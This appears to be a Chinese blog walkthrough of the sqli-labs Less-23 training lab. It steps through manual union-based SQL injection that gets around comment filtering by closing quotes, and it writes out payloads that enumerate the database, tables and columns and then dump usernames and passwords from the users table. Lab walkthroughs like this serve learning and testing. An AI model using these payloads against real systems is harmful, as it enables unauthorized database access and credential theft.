# 原创
：  （手工）【sqli-labs23】联合查询+报错回显

# （手工）【sqli-labs23】联合查询+报错回显

**目录**

[推荐：](#%C2%A0%E6%8E%A8%E8%8D%90%EF%BC%9A)

[一、（手工）SQL注入基本步骤：](#%E4%B8%80%E3%80%81%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5%EF%BC%88%E6%89%8B%E5%B7%A5%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4%EF%BC%9A)

[二、Less23（GET-Error based - strip comments）](#%E4%BA%8C%E3%80%81Less8%EF%BC%88GET%20-%20Blind%20-%20Boolian%20Based%20-%20Single%20Quotes%EF%BC%89)

[2.1、简介：（GET注入-过滤注释）](#2.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A%EF%BC%88%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5%EF%BC%89)

[2.2、第一步：注入点测试](#2.2%E3%80%81%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E6%B3%A8%E5%85%A5%E7%82%B9%E6%B5%8B%E8%AF%95)

[ 2.3、第二步：分析过滤](#%C2%A02.3%E3%80%81%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E5%88%86%E6%9E%90%E8%BF%87%E6%BB%A4)

[2.4、第三步：判断字段数](#2.4%E3%80%81%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0)

[2.5、第四步：暴库](#2.4%E3%80%81%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E6%9A%B4%E5%BA%93)

[2.6、第五步：爆表名](#%C2%A0%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E7%88%86%E8%A1%A8%E5%90%8D)

[2.7、第六步：爆字段](#%C2%A0%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E7%88%86%E5%AD%97%E6%AE%B5)

[2.8、第七步：爆数据](#%C2%A0%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E7%88%86%E6%95%B0%E6%8D%AE)

---


> 
<h2>推荐：</h2>
[【SQL注入】联合查询（最简单的注入方法）<img alt="icon-default.png?t=M666" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/125551764?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165752637916782246458034%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165752637916782246458034&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-125551764-null-null.185^v2^control&amp;utm_term=%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2&amp;spm=1018.2226.3001.4450](https://blog.csdn.net/qq_53079406/article/details/125551764?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165752637916782246458034%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165752637916782246458034&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-125551764-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2&amp;spm=1018.2226.3001.4450)[【SQL注入-可回显】报错注入：简介、相关函数、利用方法<img alt="icon-default.png?t=M666" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/125017089?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165752643116781683967253%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165752643116781683967253&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-125017089-null-null.185^v2^control&amp;utm_term=%E6%8A%A5%E9%94%99&amp;spm=1018.2226.3001.4450](https://blog.csdn.net/qq_53079406/article/details/125017089?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165752643116781683967253%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165752643116781683967253&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-125017089-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E6%8A%A5%E9%94%99&amp;spm=1018.2226.3001.4450)


 

---


---


## 一、（手工）SQL注入基本步骤：

> 
第一步：注入点测试
第二步：分析过滤
第三步：判断字段数
第四步：爆数据库名
第五步：爆表名
第六步：爆字段名
第七步：爆数据


---


---


## 二、Less23（GET-Error based - strip comments）

> 
<h3>2.1、简介：（GET注入-过滤注释）</h3>
请求方法：GET
方法：报错回显+联合查询


> 
<h3>2.2、第一步：注入点测试</h3>
使用' " ) 寻找注入点
是单引号闭合

 


> 
<h3> 2.3、第二步：分析过滤</h3>
 使用#注释后面单引号，仍报错 

 使用--+注释后面单引号，仍报错 

可以想到--+和#都已经被过滤了
接下来考虑不注释掉后面的语句
对语句进行拼接，前后各加上一个单引号闭合前后
并使用联合查询，拼接语句

 


> 
<h3>2.4、第三步：判断字段数</h3>
?id=-1' union select 1, 2, 3 '
正常回显

 
?id=-1' union select 1, 2, 3,4 '
报错

 所以字段数为3


> 
<h3>2.5、第四步：暴库</h3>
?id=-1' union select 1,2,database() '

 或者
?id=-1' union select 1,database(),3 or '1'='1<img alt="" height="841" src="https://img-blog.csdnimg.cn/e943c98be3ed45859401fc783a693e81.png" width="1200"/>
 


> 
<h3>2.6、第五步：爆表名</h3>
id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' '

或者
?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 or '1'='1

 


> 
<h3>2.7、第六步：爆字段</h3>
 ?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' '

或者
?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),3 or '1'='1

 


> 
<h3>2.8、第七步：爆数据</h3>
?id=-1' union select 1,(select group_concat(concat_ws('-',id,username,password)) from users),3 or '1'='1

 

